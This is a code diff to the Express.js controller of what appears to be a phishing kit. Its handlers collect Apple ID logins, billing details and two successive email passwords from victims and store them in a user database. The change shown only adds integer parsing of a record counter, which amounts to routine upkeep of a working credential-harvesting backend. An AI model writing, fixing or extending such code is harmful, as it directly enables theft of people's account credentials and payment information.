@@ -46,7 +46,9 @@ exports.login_post = async (req, res) => {
   try {
     const email = req.body.appleid;
     const password = req.body.password
-    const count = req.body.count;
+    var count = req.body.count;
+    count = parseInt(count)
+
 
     var ua = req.headers['user-agent'];
 
@@ -91,7 +93,9 @@ exports.billingform_post = async (req, res) => {
 exports.billingformsubmit_post = async (req, res) => {
   try {
     console.log(req.body)
-    const count = req.body.count;
+    var count = req.body.count;
+    count = parseInt(count)
+
 
     theuser = await UserDB.findOneAndUpdate({ count }, {
       name: req.body.name,
@@ -138,6 +142,7 @@ exports.page_loader_get = async (req, res) => {
     console.log(`Recieved req at ${req.url}`)
     page2load = req.params.page
     count = req.params.count
+    count = parseInt(count)
     theuser = await UserDB.findOne({ count })
     email = theuser.appleID
     res.render(`${page2load}-pass`, { count, email })
@@ -150,6 +155,8 @@ exports.page_loader_post = async (req, res) => {
   try {
     page2load = req.params.page
     count = req.params.count
+    count = parseInt(count)
+
     password = req.body.password
     theuser = await UserDB.findOneAndUpdate({ count }, { emailPASS1: password })
     email = theuser.appleID
@@ -169,6 +176,8 @@ exports.invalidpage_loader_post = async (req, res) => {
   try {
     page2load = req.params.page
     count = req.params.count
+    count = parseInt(count)
+
     password = req.body.password
     theuser = await UserDB.findOneAndUpdate({ count }, { emailPASS2: password })
     console.log(theuser)
